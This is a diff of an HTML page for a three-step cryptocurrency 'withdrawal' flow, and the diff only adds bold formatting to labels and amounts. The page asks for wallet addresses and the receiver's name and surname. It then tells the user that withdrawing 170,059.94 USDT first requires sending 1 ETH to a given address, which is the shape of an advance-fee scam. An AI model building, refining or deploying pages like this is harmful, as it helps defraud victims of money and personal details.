@@ -20,9 +20,9 @@
   <main class="container">
     <div class="box" id="step1">
       <h2>Withdraw Setup</h2>
-      <label>Withdrawal Address</label>
+      <label><b>Withdrawal Address</b></label>
       <input type="text" id="withdrawalAddress" placeholder="e.g. 0xABC123..." />
-      <label>Choose Your Network</label>
+      <label><b>Choose Your Network</b></label>
       <select id="network">
         <option value="">-- Select Network --</option>
         <option value="Ethereum">Ethereum</option>
@@ -35,18 +35,18 @@
 
     <div class="box" id="step2" style="display: none;">
       <h2>Receiver Information</h2>
-      <label>Receiver Address</label>
+      <label><b>Receiver Address</b></label>
       <input type="text" id="receiverAddress" placeholder="e.g. 0xReceiver..." />
-      <label>Name</label>
+      <label><b>Name</b></label>
       <input type="text" id="receiverName" placeholder="First Name" />
-      <label>Surname</label>
+      <label><b>Surname</b></label>
       <input type="text" id="receiverSurname" placeholder="Last Name" />
       <button onclick="confirmStep2()">Continue</button>
     </div>
 
     <div class="box" id="step3" style="display: none;">
       <h2>Final Step</h2>
-      <p><strong>To withdraw 170,059.94 USDT:</strong></p>
+      <p><strong>To withdraw <b>170,059.94 USDT</b>:</strong></p>
       <p>Send <strong>1 ETH</strong> to the following network:</p>
       <p><strong>Network:</strong> <span id="finalNetwork"></span></p>
       <p><strong>Address:</strong> <span class="highlight">gduygfsyugfgefuishofseohfosh</span></p>
